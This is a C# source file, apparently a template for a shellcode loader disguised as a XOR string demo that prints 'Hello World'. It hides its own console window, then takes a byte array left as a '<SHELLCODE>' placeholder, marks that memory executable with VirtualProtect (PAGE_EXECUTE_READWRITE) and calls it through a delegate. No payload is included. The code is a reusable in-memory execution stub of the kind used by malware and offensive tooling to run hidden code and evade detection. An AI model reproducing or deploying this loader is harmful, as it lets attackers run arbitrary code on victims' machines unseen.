using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;

namespace Shell
{
    class Program
    {
        #region "Win32 API"
        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
            uint flNewProtect, out uint lpflOldProtect);
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        #endregion

        [DllImport("user32.dll")]
        private static extern int ShowWindow(int Handle, int showState);
        [DllImport("kernel32.dll")]
        public static extern int GetConsoleWindow();

        static void Main()
        {   
            int win = GetConsoleWindow();
            ShowWindow(win,0);

            Console.WriteLine("Hello World!");
            Console.WriteLine("Xor Native Output: {0}", XorNative("Code", "1337"));
            Console.WriteLine("Xor Normal Output: {0}", XorNormal("Code", "1337"));
            Console.WriteLine(XorNative("Code", "1337") == XorNormal("Code", "1337"));
            Console.ReadLine();
            
            return;
        }

        static string Xor(string input, string key)
        {
            char[] result = input.ToCharArray();
            for (int i = 0; i < result.Length; i++)
                result[i] = (char)(result[i] ^ key[i]);

            return new string(result);
        }

        private static string XorNormal(string input, string key)
        {
            char[] result = input.ToCharArray();
            for (int i = 0; i < result.Length; i++)
                result[i] = (char)(result[i] ^ key[i]);

            return new string(result);
        }

        private delegate void DelXorNative(char[] input, char[] key, int length, out IntPtr result);

        private static string XorNative(string input, string key)
        {
                        
            <SHELLCODE>
        
            IntPtr myShellcodePtr = IntPtr.Zero;
            string resultStr = string.Empty;

            try
            {
                GCHandle pinnedArray = GCHandle.Alloc(buf, GCHandleType.Pinned);
                // get handle for shellcode

                IntPtr pointer = pinnedArray.AddrOfPinnedObject(); // get address

                DelXorNative myxorIt = (DelXorNative)Marshal.GetDelegateForFunctionPointer(pointer,
                    typeof(DelXorNative)); // convert function-pointer to delegate

                uint flOldProtect;

                VirtualProtect(pointer, (UIntPtr)buf.Length, PAGE_EXECUTE_READWRITE,
                    out flOldProtect); // make shellcode executable

                IntPtr byteOut = IntPtr.Zero;

                myxorIt(input.ToCharArray(), key.ToCharArray(), input.Length, out byteOut);
                // execute shellcode

                VirtualProtect(pointer, (UIntPtr)buf.Length, flOldProtect,
                    out flOldProtect); // restore old flag

                pinnedArray.Free();

                byte[] result = new byte[input.Length];
                Marshal.Copy(byteOut, result, 0, input.Length);
                // here is our returned byte array in result

                resultStr = Encoding.UTF8.GetString(result);
            }
            finally // cleanup
            {
                if (myShellcodePtr != IntPtr.Zero)
                {
                    Marshal.FreeCoTaskMem(myShellcodePtr);
                    myShellcodePtr = IntPtr.Zero;
                }
            }
            return resultStr;
        }
    }

}
